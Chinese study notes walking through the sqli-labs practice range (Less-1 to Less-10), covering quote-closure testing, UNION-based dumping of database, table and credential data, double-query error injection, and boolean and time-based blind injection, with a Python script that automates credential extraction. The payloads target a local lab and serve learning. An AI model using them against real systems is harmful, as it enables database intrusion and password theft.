## Sql注入

*Jarvis  2023.2.20*

#### 配置

使用小皮面板，以及https://github.com/Audi-1/sqli-labs  这个sqli项目进行学习，将github下载的文件放入小皮目录WWW中并按照项目readme进行配置，主要配置用户名和密码以接入靶场。在其他机器上可以使用小皮所在机器的ip以及配置的域名进行访问，如  http://192.168.xxx.xxx/sqli-labs/  ，进入网站后首先点击下方Setup/reset Database for labs进行数据库设置，之后进入最上方SQLi-LABS Page-1(Basic Challenges)开始学习。

#### 可能遇到的问题

进入Setup/reset Database for labs可能会出错：Fatal error: Uncaught Error: Call to undefined function mysql_connect() in sqli-labs\sql-connections\setup-db.php:29 Stack trace: #0 {main} thrown in sqli-labs\sql-connections\setup-db.php on line 29

出错原因为在php5.0开始mysql_connect()不推荐使用了，而在php7.0中被废弃，7.0及以上版本使用mysqli_connect()代替，这里可以在小皮中设置使用更低版本的php



### 第一题：常规类型

SQLi-LABS Page-1(Basic Challenges) Less-1

GET-Error based-Single quotes-String

1、第一题首先尝试传入参数判断是否为字符型

```
?id=1 and 1=1   ?id=1 and 1=2
```

第一条恒为真，查看是否报错，再尝试第二条，若第一条不报错第二条没有输出则为整型，均不报错则为字符型。

2、对于字符型进行闭合测试

```
?id=1'
?id=1"
?id=1'--+
?id=1"--+
?id=1' AND 1=2 union select 1,(select group_concat(schema_name) from information_schema.schemata),3--+
```

对于此题先尝试上述几种参数，结果如下：

第一种单引号会报错：You have an error  in your SQL syntax; check the manual that corresponds to your MySQL  server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

第二种双引号则会成功登录显示：Your Login name:Dumb Your Password:Dumb

这里第一种使用单引号判断出错是因为传入参数后查询语句中多了一个单引号，所以会报错。

第三种使用--+来注释掉后面的语句，其实--空格在sql中表示注释作用，+号表示空格，注意这里若想起到注释作用则--后面必须有个空格，当然也可以--空格再加上任意字符，另外还可以使用#注释，但是需要进行编码为%23，也可以使用--%20将空格url encode为%20，单引号为%27，双引号为%22，以上均为在url的GET请求中。若是POST请求，可以直接使用#。不同数据库的注释方式不同，以上为Mysql中的注释方式。

第三种不报错，因为将多余的单引号注释掉了

第四种不报错，参看后方例子，实际上双引号每成一对则闭合一对，最先出现的两个双引号自己构成了一段。

**单错双不错，则尝试单加注释，错则单引号和括号闭合，不报错则单引号闭合**

**双错单不错，则尝试双加注释，错则双引号和括号闭合，不报错则双引号闭合**

3、尝试显示位

首先使用order by x，若x大于列数则报错，比如当order by 4报错，而order by 3正常则说明有3列。

之后测试当前页面中显示的信息是结果中的哪几项，需要使用union，此时若前面若还是id=1这种正确的查询再加上union则输出结果时前面正确查询的结果也会占用一部分位置，我们希望得到的是在使用union select 1,2,3这样的语句时能够通过显示结果中123哪几项来判断显示位，所以要求union前面的语句需要是一个错误的语句，这里可以使用id=1 and 1=2 union ...使其出错，或者将id的值设为一个不会在数据库中出现的值，例如id=-1 union...

通过union联合查询发现页面上显示的两项信息分别为结果中的第二项2和第三项3，说明对于我们想要的信息使其在查询结果中处于第二三项则可以从页面上看到显示。

#### SQL注入思路：闭合测试、测显示位、查所需内容

**闭合测试**即尝试代码中是怎么写闭合的，用的是单引号、双引号、括号、括号和单引号、多层括号和单引号等。mysql还可以使用括号和双引号以及多层括号和双引号，mysql中其实单引号和双引号没有区别都可以表示字符串，另外在查询字段本身具有某种引号需要进行转义时，那就需要使用另外一种引号来进行转义，以及使用保留字作为字段时必须加上反引号来区分。标准sql中字符串使用单引号，字符串本身使用单引号则转义使用两个单引号。

**测显示位**即尝试在页面中显示出来的信息是处于哪一个位置，要将显示位留给有效信息。

若sql正确正常返回但页面中不包含有用信息，而sql错误时页面会显示错误信息，此时采用double injection。对于页面不管正误都没有显示变化的则采取报错注入。若也没有报错提示则尝试布尔盲注（正确和错误状态的页面之间存在切换）。若也没有状态切换则尝试时间盲注（时间盲注可以采用二分节省时间）。

**对第一题对应的php代码进行审阅，核心部分如下：**

```
<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
// take the variables 
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
...
}
	else { echo "Please input the ID as parameter with numeric value";}

?>
```

构成数据库查询的select语句如下：

```
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

对其中的$id使用上述几种参数替换后如下：

```
$sql="SELECT * FROM users WHERE id='1'' LIMIT 0,1";
实际执行 SELECT * FROM users WHERE id='1'' LIMIT 0,1  出错
$sql="SELECT * FROM users WHERE id='1"' LIMIT 0,1";
实际执行 SELECT * FROM users WHERE id='1"' LIMIT 0,1  不出错
$sql="SELECT * FROM users WHERE id='1'--+' LIMIT 0,1";
实际执行 SELECT * FROM users WHERE id='1'  --+' LIMIT 0,1  不出错，多余单引号被注释掉
$sql="SELECT * FROM users WHERE id='1"--+' LIMIT 0,1";
实际执行 SELECT * FROM users WHERE id='1"  --+' LIMIT 0,1  不出错
$sql="SELECT * FROM users WHERE id='1' AND 1=2 union select 1,(select group_concat(schema_name) from information_schema.schemata),3--+' LIMIT 0,1";
```

**第二种和第四种不出错，一种解释是Mysql中不严格，虽然多了一个双引号，查询时会把它当成两个单引号闭合，所以不会报错。**

参看下面例子加深理解：

```
$query = 'select * from A where id = "'.$id.'"limit 0,1';
传入参数为id=1"and 1=1 --+,则语句如下
$query = 'select * from A where id = "'.1"and 1=1 --+.'"limit 0,1';
在执行时前后两个使用单引号框起来的部分和中间使用两个点..的部分共三个部分内容相连如下
select * from A where id = "1"and 1=1 --+"limit 0,1
可见在执行时为双引号闭合，且使用注释符将多出来的limit前面那个双引号给注释掉了
```

**第五种**

首先使用order by x测列数，之后使用union测显示位测出在第二第三位，最后获取数据，这里由于使用Mysql，其数据库中information_schema库可以利用来获取信息，其他常见数据库如何获取信息待整理。

information_schema数据库是有关数据库的数据库，存储着其他数据库的详细信息。

```
select * from information_schema.tables;列出所有表，此表存放了当前所有数据库的表，效果等同于所有数据库下show tables的合集，table_name列记录所有表的名字合集，table_schema记录所有数据库名的合集。

information_schema.columns存放所有列名，其中table_name列记录所有表名合集，另有table_schema、column_name列

select * from information_schema.table_constraints;列出所有约束

information_schema.schemata 此表存放了当前所有数据库，等同于show databases;其中的schema_name列包含了当前数据库中各数据库名称。

group_concat(xxx)：是将分组中括号内对应的字符串进行连接，如果分组中括号内对应有多行，就将这多行字符串连接，默认以逗号分隔，可以指定separator。

内置函数
select version();返回mysql版本
select user();数据库用户
select database();数据库名
@datadir数据库路径
@@versioncompileos操作系统
```

这里可以通过第五种注入获取到Your Login name : information_schema, challenges, mysql, performance_schema, security, sys
Your Password:3

对于security会比较关注，这里进一步获取其中信息：

```
?id=1' AND 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3--+
//获得Your Login name:emails,referers,uagents,users Your Password:3

对于其中users表进一步获取列名
?id=1' AND 1=2 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security'),3--+
//获得Your Login name:id,username,password Your Password:3

对于其中用户名和密码进行获取
?id=1' AND 1=2 union select 1,group_concat(username),group_concat(password) from users--+
//获得Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
//Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
```

至此通过sql注入获取了其数据库中关键信息，当然密码可能是MD5加密的需要解密。



### Double Injection

rand()返回一个[0,1)随机数，左闭右开。floor()函数是向下取整，一个float参数，返回小于等于输入参数的最大整数。count()函数用于计数。

```
select floor(rand(14)*2) from information_schema.columns limit 5;
以14作为种子时产生的随机整数数列前四位为1010，此时两列便可出错，当使用0作为种子此时3列才会出错，可见当不指定种子只要列数足够多其实就会出错。

select table_schema, count(*) from information_schema.tables group by table_schema;
统计出各个模式有多少张表

select floor(rand(14)*2) c, count(*) from information_schema.columns group by c;
列c是随机整数数列的别名，此时会报错ERROR 1062 (23000): Duplicate entry '0' for key 'group_key'，常常使用columns表因为存在很多行总能出错。
```

根据错误信息，便可以获取到我们需要的信息：

```
select concat((select database()), floor(rand(14)*2)) c, count(*) from information_schema.columns group by c;
select concat((select user from mysql.user limit 1), floor(rand(14)*2)) c, count(*) from information_schema.columns group by c;
select concat((select password from mysql.user limit 1), floor(rand(14)*2)) c, count(*) from information_schema.columns group by c;

实际注入中使用：
?id=1' union select 1,concat((select database()), floor(rand(14)*2)) c, count(*) from information_schema.columns group by c %23
//返回Duplicate entry 'root@localhost0' for key ''

通过调整limit对数据库中表名进行读取
?id=1' union select 1,concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand(14)*2)) c,count(*) from information_schema.columns group by c %23

通过调整limit对users表中列进行读取
?id=1' union select 1,concat((select column_name from information_schema.columns where table_name='users' limit 4,1),floor(rand(14)*2)) c,count(*) from information_schema.columns group by c %23
//此处表中limit 4，1时为username列名，limit 5，1时为password列名

通过调整limit对users表中用户名和密码内容进行读取
?id=1' union select 1,concat((select username from users limit 0,1),':',(select password from users limit 0,1),floor(rand(14)*2)) c,count(*) from information_schema.columns group by c %23
//冒号起到分隔作用便于分清用户名和密码
```

报错解释：

> 猜测在做这样的统计时，Mysql会建立一张临时表，有group_key和tally两个字段，其中group_key设置了UNIQUE约束，即不能有两行的group_key列的值相同。
>
> 开始时临时表为空。Mysql逐行扫描information_schema.tables表，遇到的第一个分组列（table_schema）值为information_schema，便去查询临时表中是否有group_key为information_schema的行，发现没有，便在临时表中新增一行，group_key为information_schema，tally为1。Mysql继续扫描information_schema.tables表，遇到的第二个分组列（table_schema）的值还是information_schema，去查询临时表中是否有group_key为information_schema的行，发现有，于是将该行的tally增加1。最后统计出了各个模式有多少表。
>
> 在列c报错中，Mysql开始逐行扫描information_schema.columns表，遇到的第一个分组列是floor(rand(14)x2)，计算出其值为1，便去查询临时表中是否有group_key为1的行，发现没有，便在临时表中新增一行，group_key为floor(rand(14)x2)，注意此时又计算了一次结果为0。所以实际插入到临时表的一行group_key为0，tally为1。Mysql继续扫描information_schema.columns表，遇到的第二个分组列还是floor(rand(14)x2)，计算出其值为1（这个1是随机数列的第三个数），便去查询临时表中是否有group_key为1的行，发现没有，便在临时表中新增一行，group_key为floor(rand(14)x2)，此时又计算了一次，结果为0（这个0是随机数列的第四个数），所以尝试向临时表插入一行数据，group_key为0，tally为1。但实际上临时表中已经有一行的group_key为0，而group_key又设置了不可重复的约束，所以报错。
> ————————————————
> 版权声明：本文为CSDN博主「Werneror」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
> 原文链接：https://blog.csdn.net/wn314/article/details/89297560

计算两次rand()时Mysql的一个bug所以其他数据库不能这样注入。但其他数据库含有类似出错函数。

若Double injection没有可查的表则自己构造一个表

```
select count(*) from (select 1 union select 2) temp group by concat(floor(rand(14)*2), (select user()));
```

Mysql 5.1引入的extractvalue()从XML中提取值，第一个参数为XML格式字符串，第二个参数为有效xpath，当第二个参数无效则会报错，可以利用select extractvalue(0, concat(0x5C, (select user())));另外updatexml()函数用来更新XML中特定节点值，第一个参数为XML格式字符串，第二个参数为xpath，第三个格式为要更新的值，同样利用第二个参数无效如select updatexml(1,concat(0x5C,(select user())),1);



### Outfile

https://blog.csdn.net/weixin_54217950/article/details/122971505

需要root权限。。。那还sql注入个啥。。。



### 布尔盲注

对于只有正误两种状态之间切换的情况，使用布尔盲注，一般首先使用length()判断查询结果长度，再使用substr()截取字符穷举出内容。

第一步使用

```
?id=1' and length(database())=1 --+
依次尝试1,2,3...直到长度正确，此时页面显示正常
```

接下来枚举字符

```
?id=1 and ascii(substr( 查询语句 ,1,1))=32 --+
每个字符有95种可能，32-126
```

使用脚本进行GET盲注：

```python
import requests

# 目标网址，不含参数
url = "http://192.168.244.131/Less-8/"

payload_len = """?id=1' and length(
	                (select group_concat(username,':',password)
                    from users)
                ) < {n} --+"""

payload_str = """?id=1' and ascii(
	                substr(
		                (select group_concat(username,':',password)
		                from users)
	                ,{x},1)
                ) = {r} --+"""


def getLength(url, payload):
    length = 1
    while True:
        response = requests.get(url=url + payload_len.format(n=length))
        if 'You are in...........' in response.text:
            print('完成长度测试，长度：', length, )
            return length
        else:
            length += 1


def getStr(url, payload, length):
    str = ''
    for l in range(1, length + 1):
        for n in range(33, 126):
            response = requests.get(url=url + payload_str.format(x=l, r=n))
            # 32是空格
            if 'You are in...........' in response.text:
                str += chr(n)
                print(chr(n))
                break
    print(str)
    return str


length = getLength(url, payload_len)
getStr(url, payload_str, length)

# 最后输出 完成长度测试，长度： 189，此长度为加了冒号的，是为了隔开名称和密码，真实长度可以把上述两个冒号位置删掉
# Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4
```



### 时间盲注

页面始终只有一种，不显示错误状态，此时需要结合sleep()函数，通过时间延迟来判断是否出错。

常用if(e1,e2,e3)即e1为真则返回e2，否则返回e3

此时如何判断闭合，即使用

```
?id=1' and if(1=2,1,sleep(2)) --+
若构成闭合，则执行闭合后面的代码，而闭合内部的代码不执行，此时若sleep3秒则闭合为单引号
```

之后判断数据库名长度

```
?id=1' and if(length(database())>8,sleep(2),0) --+
```

之后判断数据库名，逐个尝试字符

```
?id=1' and if(ascii(substr(database(),1,1))=115,sleep(2),0) --+
```

之后判断表名，逐个尝试字符

```
?id=1’ and if(ascii(substr((select table_name from information_schema.tables where table_schema=‘security’ limit 0,1),1,1))=101,sleep(2),0) --+
?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),2,1))=109,sleep(2),0) --+
```

之后判断列名，逐个尝试字符

```
?id=1’ and if(ascii(substr((select column_name from information_schema.columns where table_name=‘users’ and table_schema=database() limit 0,1),1,1))=105,sleep(2),1)–+
```

最后获取数据，逐个尝试字符

```
?id=1' and if(ascii(substr((select username from users limit 0,1),1,1))=68,sleep(2),1)--+
```





### 后续题目总结

Less-1  字符型单引号  GET

Less-2  整型Intiger based  GET

Less-3  字符型单引号和括号  GET

Less-4  字符型双引号和括号  GET

Less-5  Double字符型单引号  GET

Less-6  Double字符型双引号  GET

Less-7  Dump into outfile 字符型单引号双括号  GET

Less-8  布尔盲注 字符型单引号  GET

Less-9  时间盲注 字符型单引号  GET

Less-10 时间盲注 字符型双引号  GET

待续



#### 附录

**逻辑运算**

在where子句中的过滤条件

AND逻辑与，所有值为真才返回真，否则返回假，所以只要遇到假就是假了就不再往后执行了。

OR逻辑或，有真则返回真，否则返回假，所以只要遇到真就是真了就不再往后执行了。

Sql中AND的优先级高于OR。

**联合运算**

union压缩多个集合中重复的结果，使得结果中没有重复行，但列名要相同，取并集且没有重复，默认排序。

union all对多个集合取并集并且有重复行，不进行排序。

select a from A union select b from B;

顺序上先where再union

**连接查询**

内连接左连接右连接，将一个主表作为结果集，将其他表的行选择性连接到主表上。

内连接inner join，from A inner join B on A.a=B.b;使用on设置连接的条件。

左连接，主表在左，主表全显示，其他表没匹配的会以NULL显示，from A left join B on A.a=B.b;

右连接，主表在右，主表全显示，其他表没匹配的会以NULL显示，from A right join B on A.a=B.b;

**SQL注入分类**

1，类型：字符型、数字型、搜索型
2，位置：GET、POST、Cookie、HTTP头部（XFF，User-Agent，REFERER等）
3，显示状态：double、报错、布尔盲注、堆查询注入（多条语句）



